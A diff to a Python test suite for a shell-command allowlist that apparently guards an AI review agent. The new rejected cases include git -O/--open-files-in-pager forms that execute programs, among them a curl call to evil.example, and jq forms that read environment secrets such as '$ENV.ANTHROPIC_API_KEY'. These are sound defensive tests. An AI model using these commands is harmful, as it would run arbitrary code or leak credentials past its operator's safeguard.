@@ -42,6 +42,9 @@ ALLOWED = [
     "sed -n '10,40p' file.py",
     "sed -n '5p' file.py",
     "sed -n '10,$p' file.py",
+    "jq -r .version package.json",
+    "jq .env config.json",
+    "jq .environment.name config.json",
     "head -n 50 f.py",
     "tail -n +100 f.py",
     "wc -l f.py",
@@ -183,6 +186,23 @@ REJECTED = [
     ("touch newfile", "touch"),
     ("tee /tmp/x", "tee"),
     ("dd if=/dev/zero of=/tmp/x", "dd"),
+    # --- git flags that run an external program ------------------------------
+    # `-O<prog>` / `--open-files-in-pager=<prog>` EXECUTE <prog> with the matched
+    # files as arguments, laundering any binary past _KNOWN_DANGEROUS because the
+    # adjudicated program is `git`. Distinct from `-o` (write); case matters.
+    ("git grep -Osh needle", "git-open-files-in-pager-short"),
+    ("git grep -Obash needle", "git-open-files-in-pager-bash"),
+    ("git grep -O\"sh -c 'curl http://evil.example/x'\" needle",
+     "git-open-files-in-pager-argument"),
+    ("git grep --open-files-in-pager=sh needle",
+     "git-open-files-in-pager-long"),
+    ("git log -Osh", "git-open-files-in-pager-on-log"),
+    # --- jq reading the process environment ----------------------------------
+    # The review CLI inherits Kōan's environ (API keys, Telegram/GitHub tokens);
+    # `$ENV` in single quotes is inert to Bash, so the dollar check never sees it.
+    ("jq -n env", "jq-env-builtin"),
+    ("jq -rn '$ENV.ANTHROPIC_API_KEY'", "jq-ENV-variable"),
+    ("jq -n 'env|keys'", "jq-env-piped-in-program"),
     # --- parser edge cases ---------------------------------------------------
     ('git log "unterminated', "unbalanced-quote"),
     ("", "empty"),
@@ -248,6 +268,54 @@ class TestUnquotedPipe:
         assert not _has_unquoted_pipe(r"git grep 'a\|b'")  # escaped-in-quote
         assert not _has_unquoted_pipe(r"git grep 'a' \| sort")  # backslash-escaped
         assert not _has_unquoted_pipe("echo 'x||y'")
+
+
+class TestGitOpenFilesInPager:
+    """`git -O` executes a program; `-o` only writes. Both must be denied."""
+
+    def test_short_flag_with_folded_program_is_denied(self):
+        allowed, reason = is_allowed("git grep -Osh needle")
+        assert not allowed
+        assert "external program" in reason
+
+    def test_long_flag_is_denied(self):
+        allowed, reason = is_allowed("git grep --open-files-in-pager=sh n")
+        assert not allowed
+        assert "external program" in reason
+
+    def test_case_matters_and_lowercase_o_keeps_its_own_reason(self):
+        """`-o` writes, `-O` executes -- the two must not be conflated."""
+        allowed, reason = is_allowed("git diff -o /tmp/x")
+        assert not allowed
+        assert "writes to a file" in reason
+
+    def test_oneline_is_not_caught_by_the_short_flag(self):
+        """`--oneline` must not be swallowed by a `-O` startswith check."""
+        allowed, reason = is_allowed("git log --oneline -5")
+        assert allowed, reason
+
+
+class TestJqEnvironmentAccess:
+    """jq is the only allowlisted reader that can reach the process environ."""
+
+    def test_env_builtin_is_denied(self):
+        allowed, reason = is_allowed("jq -n env")
+        assert not allowed
+        assert "process environment" in reason
+
+    def test_ENV_variable_is_denied_even_single_quoted(self):
+        """Single-quoted `$` is inert to Bash, so the dollar check misses it."""
+        allowed, reason = is_allowed("jq -rn '$ENV.HOME'")
+        assert not allowed
+        assert "process environment" in reason
+
+    def test_field_named_env_is_still_allowed(self):
+        allowed, reason = is_allowed("jq .env config.json")
+        assert allowed, reason
+
+    def test_field_prefixed_env_is_still_allowed(self):
+        allowed, reason = is_allowed("jq .environment.name config.json")
+        assert allowed, reason
 
 
 class TestOperandConstraint:
